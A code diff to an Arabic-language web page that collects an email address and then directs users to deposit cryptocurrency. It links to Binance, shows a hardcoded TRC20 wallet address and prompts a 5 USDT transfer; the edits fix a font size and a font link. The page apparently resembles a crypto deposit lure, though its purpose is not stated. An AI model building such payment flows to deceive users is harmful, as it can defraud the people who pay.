@@ -8,7 +8,7 @@
     <!-- جلب خط Cairo الاحترافي من جوجل -->
     <link rel="preconnect" href="https://googleapis.com">
     <link rel="preconnect" href="https://gstatic.com" crossorigin>
-    <link href="https://googleapis.com" rel="stylesheet">
+    <link href="https://googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
 
     <style>
         body { 
@@ -143,14 +143,15 @@
                     <label for="username">البريد الإلكتروني</label>
                     <input type="text" id="username" required placeholder="example@gmail.com" style="font-family: 'Cairo', sans-serif; width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 8px; margin-top: 8px; box-sizing: border-box;">
                 </div>
-                <button type="button" onclick="goToStep2()" style="font-family: 'Cairo', sans-serif; width: 100%; padding: 14px; background: linear-gradient(to right, #7b2cbf, #9d4edd); color: #fff; border: none; border-radius: 8px; font-weight: bold; font-size: 166px; margin-top: 20px; cursor: pointer;">متابعة إلى الإيداع</button>
+                <!-- تم إصلاح حجم الخط البرمجي المسبب للمشكلة هنا ليصبح 16px -->
+                <button type="button" onclick="goToStep2()" style="font-family: 'Cairo', sans-serif; width: 100%; padding: 14px; background: linear-gradient(to right, #7b2cbf, #9d4edd); color: #fff; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; margin-top: 20px; cursor: pointer;">متابعة إلى الإيداع</button>
                 
                 <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
                 
                 <img src="logo.png" alt="logo" class="bottom-logo">
             </div>
 
-            <!-- الخطوة الثانية: خيارات الإيداع بعد التعديل والاصلاح -->
+            <!-- الخطوة الثانية: خيارات الإيداع -->
             <div id="step2" style="display: none; margin-top: 15px;">
                 
                 <a href="https://binance.com" class="binance-btn-final">
@@ -160,7 +161,6 @@
                 <div style="margin-top: 25px; padding: 15px; border: 1px dashed #ffffff33; border-radius: 8px; background: #0f0c1b; text-align: center;">
                     <p style="font-size: 14px; margin-bottom: 10px; color: #bbb;">أو للإيداع من OKX وباقي المحافظ (شبكة TRC20):</p>
                     
-                    <!-- تم تصحيح حرف K ليصبح كابيتال هنا وضبط التصميم لمنع التقطيع -->
                     <input type="text" value="THJN4XBKxbZNYsw7YAhmNiZSupn3KVEDFP" id="cryptoAddress" readonly style="font-family: 'Cairo', sans-serif; width: 100%; padding: 10px; text-align: center; background: #1a1530; color: #fff; border: 1px solid #444; border-radius: 4px; font-size: 11px; direction: ltr; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; box-sizing: border-box;">
                     
                     <button onclick="copyWalletAddress()" type="button" style="font-family: 'Cairo', sans-serif; padding: 8px 12px; background: #333; color: #fff; border: 1px solid #555; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: bold; margin-top: 12px; width: 100%;">نسخ عنوان المحفظة</button>
@@ -185,7 +185,6 @@
     function copyWalletAddress() {
         const copyText = document.getElementById("cryptoAddress");
         
-        // ميزة النسخ الذكي وحذف المسافات المضافة
         navigator.clipboard.writeText(copyText.value.trim()).then(() => {
             alert("تم نسخ عنوان المحفظة بشكل سليم! قم بالتحويل من OKX أو أي محفظة أخرى على شبكة TRC20 بقيمة 5 USDT.");
         }).catch(err => {
